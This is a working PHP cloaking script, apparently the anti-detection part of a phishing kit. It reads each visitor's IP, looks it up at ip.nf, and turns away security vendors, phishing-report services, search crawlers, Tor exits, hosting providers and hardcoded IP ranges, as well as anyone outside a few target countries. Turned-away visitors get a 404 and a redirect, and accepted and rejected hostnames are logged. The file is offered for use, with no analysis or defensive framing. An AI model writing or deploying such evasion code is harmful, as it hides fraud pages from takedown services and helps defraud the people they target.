<?php
require_once './config_bots.php';
date_default_timezone_set('Europe/Paris');
function visitorips() {
	 if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])){$ip = $_SERVER["HTTP_CF_CONNECTING_IP"];}
	 else if (getenv('HTTP_CLIENT_IP')){$ip = getenv('HTTP_CLIENT_IP');}
     else if(getenv('HTTP_X_FORWARDED_FOR')) {$ip = getenv('HTTP_X_FORWARDED_FOR');}
     else if(getenv('HTTP_X_FORWARDED')) {$ip = getenv('HTTP_X_FORWARDED');}
     else if(getenv('HTTP_FORWARDED_FOR')) {$ip = getenv('HTTP_FORWARDED_FOR');}
     else if(getenv('HTTP_FORWARDED')) {$ip = getenv('HTTP_FORWARDED');}
     else if(getenv('REMOTE_ADDR')) {$ip = getenv('REMOTE_ADDR');}
     else {$ip = $_SERVER['HTTP_HOST'];}
	 $ip=explode(",",$ip);
	 return $ip[0];
}
$ip = visitorips();
$hostname = gethostbyaddr($ip);
//////////////////////////////////
$acchostsfile = "./log/Accepted_hosts.txt";
$acchosts = @file_get_contents($acchostsfile);
$historyfile = "./log/Visitors_history.txt";
$history = @file_get_contents($historyfile);
$rejhostsfile = "./log/Rejected_hosts.txt";
$rejhosts = @file_get_contents($rejhostsfile);
//////////////////////////////////
$ipstart = array(
"38.5.4.35",
"109.201.128.0",
"134.209.112.0",
"38.32.5.0",
"205.169.38.0",
"68.183.248.0",
"156.146.41.255",
"213.152.1.0",
"217.61.96.0",
"104.132.20.72",
"185.22.216.0",
"178.213.64.0",
"54.208.0.0",
"193.200.150.0",
"14.140.80.178",
"66.102.8.0",
"185.75.141.32",
"83.31.40.0",
"54.183.0.0",
"81.161.59.0",
"4.14.64.0",
"139.59.0.0",
"83.31.197.0",
"146.112.209.0",
"37.187.172.0",
"77.40.129.0",
"66.249.93.88",
"38.0.32.0",
"54.156.0.0"
);
$ipend = array(
"38.16.135.255",
"109.201.132.255",
"134.209.131.255",
"38.32.7.255",
"205.169.39.255",
"68.183.251.255",
"156.146.41.0",
"213.152.1.255",
"217.61.103.255",
"104.132.20.79",
"185.22.219.255",
"178.213.66.41",
"54.211.255.255",
"193.200.150.255",
"14.141.1.26",
"66.102.8.137",
"185.75.141.39",
"83.31.41.255",
"54.183.255.255",
"81.161.59.255",
"4.14.65.255",
"139.59.8.35",
"83.31.197.0",
"146.112.240.255",
"37.187.173.255",
"77.40.132.127",
"66.249.93.202",
"38.1.23.255",
"54.167.255.255"
);
function ANTI_ANTISPAM($ip){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://ip.nf/$ip.json");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$resp = curl_exec($ch);
	curl_close($ch);
	$ipDetails = json_decode($resp,true);
	$c_code = $ipDetails["ip"]["country_code"];
	$_SESSION["ip"] = $ip;
	$_SESSION["hostname"] = $ipDetails["ip"]["hostname"];
	$_SESSION["country"] = $ipDetails["ip"]["country"];
	$_SESSION["asn"] = $ipDetails["ip"]["asn"];
	$_SESSION["dtetme"] = date('d/m/Y H:i:s', time());
	$blocked_words = array("ni.net.tr","hetzner", "quadranet","tor","datapacket","CenturyLink","networktransit","cdn77","", "cloudflare","kaspersky","avast","microsoft","comodo","Scalair","outlook","hotmail","microsoft","TIME","Digital Ocean","1and1","1und1.de","aruba","OVH","beget","drweb","Dr.Web","hostinger","scanurl","above","google","facebook","softlayer","amazon","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit",);
	$blacklist=array("193.105.73.213","159.242.228.232","188.79.236.26","54.36.88.227","54.36.88.227","54.37.163.16","54.36.138.92", "81.161.202.51", "79.148.239.152","109.201.130.13","68.183.241.134","159.65.210.36","185.93.2.124","5.253.206.114","37.62.61.224","51.89.103.123","37.120.192.24","156.146.41.129","68.183.250.75","42.15.223.0","87.115.231.193","80.44.173.199","38.0.128.3","178.128.140.117","173.44.36.75","83.56.120.226", "195.55.73.213", "196.18.105.100", "2.138.59.28", "2.138.56.71", "83.43.60.89", "188.87.161.30","185.183.106.124", "93.176.153.237", "93.6.173.98", "212.83.145.0","109.190.254.0","92.184.102.0", "92.184.101.0","80.12.58.0", "80.12.59.0", "92.184.108.0", "109.190.254.0", "92.184.104.0", "92.184.100.0", "92.184.96.0", "92.154.35.0", "5.39.235.0", "2.15.55.0", "92.184.105.0", "80.13.96.0", "77.136.43.0", "80.12.38.0", "193.252.172.0", "77.136.196.0", "212.83.135.0", "145.239.156.0", "212.83.149.0","^66.102.*.*","^38.100.*.*","^107.170.*.*","^149.20.*.*","^38.105.*.*","^74.125.*.*","^66.150.14.*","^54.176.*.*","^38.100.*.*","^184.173.*.*","^66.249.*.*","^128.242.*.*","^72.14.192.*","^208.65.144.*","^74.125.*.*","^209.85.128.*","^216.239.32.*","^74.125.*.*","^207.126.144.*","^173.194.*.*","^64.233.160.*","^72.14.192.*","^66.102.*.*","^64.18.*.*","^194.52.68.*","^194.72.238.*","^62.116.207.*","^212.50.193.*","^69.65.*.*","^50.7.*.*","^131.212.*.*","^46.116.*.* ","^62.90.*.*","^89.138.*.*","^82.166.*.*","^85.64.*.*","^85.250.*.*","^89.138.*.*","^93.172.*.*","^109.186.*.*","^194.90.*.*","^212.29.192.*","^212.29.224.*","^212.143.*.*","^212.150.*.*","^212.235.*.*","^217.132.*.*","^50.97.*.*","^217.132.*.*","^209.85.*.*","^66.205.64.*","^204.14.48.*","^64.27.2.*","^67.15.*.*","^202.108.252.*","^193.47.80.*","^64.62.136.*","^66.221.*.*","^64.62.175.*","^198.54.*.*","^192.115.134.*","^216.252.167.*","^193.253.199.*","^69.61.12.*","^64.37.103.*","^38.144.36.*","^64.124.14.*","^206.28.72.*","^209.73.228.*","^158.108.*.*","^168.188.*.*","^66.207.120.*","^167.24.*.*","^192.118.48.*","^67.209.128.*","^12.148.209.*","^12.148.196.*","^193.220.178.*","68.65.53.71","^198.25.*.*","^64.106.213.*","54.228.218.117","^54.228.218.*","185.28.20.243","^185.28.20.*","217.16.26.166","^217.16.26.*");
	foreach($blocked_words as $word) {
		if (strrpos(strtoupper($resp), strtoupper($word)) ) {
			return true;
		}
	}
	if(in_array($ip, $blacklist)){
		return true;
	}
	if (!in_array($c_code, array("ES","CH","DE","AU","AT","PT","FR","GB","CA"))){
		return true;
	}
	// $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,2);
	// if($lang != "fr"){
		// return true;
	// }
	return false;
}
function ipbetweenrange($needle, $start, $end) {
	foreach($start as $key => $star){
	  if((ip2long($needle) >= ip2long($star)) && (ip2long($needle) <= ip2long($end[$key]))) {
		return true;
	  }
	}
  return false;
}

if(ANTI_ANTISPAM($ip) || ipbetweenrange($ip, $ipstart, $ipend)){
		if(false === strpos($rejhosts,$hostname)) {
			file_put_contents($rejhostsfile,"$hostname\n",FILE_APPEND);
		}
		header("HTTP/1.0 404 Not Found");
		header("Location: $url_redirect ");
		$engine = "0";
		exit;
}else{
	$engine = "1";
	if(false === strpos($acchosts,$hostname)) {
		file_put_contents($acchostsfile,"$hostname\n",FILE_APPEND);
	}
}